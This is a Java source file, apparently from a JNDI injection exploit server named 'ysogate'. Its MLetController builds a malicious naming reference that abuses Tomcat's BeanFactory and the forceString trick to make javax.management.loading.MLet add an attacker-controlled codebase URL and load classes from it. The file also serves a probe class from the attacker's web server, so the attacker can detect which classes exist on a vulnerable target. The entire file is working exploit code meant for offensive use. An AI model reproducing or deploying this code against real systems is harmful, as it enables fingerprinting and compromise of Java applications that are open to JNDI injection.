package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.config.JndiConfig;
import com.h2tg.ysogate.controller.Controller;
import com.h2tg.ysogate.exploit.server.WebServer;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/MLet")
public class MLetController implements Controller {
    public Object process(String className) {
        System.out.println("[Reference] Factory: BeanFactory + MLet");

        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", className));
        ref.add(new StringRefAddr("b", JndiConfig.codebase));
        ref.add(new StringRefAddr("c", className + "_exists"));

        WebServer.getInstance().serveFile("/" + className.replace(".", "/") + "_exists.class", null);
        return ref;
    }

    @JNDIMapping("/{className}")
    public String detectClass(String className) {
        System.out.println("[MLet] Detect ClassName: " + className);
        return className;
    }
}
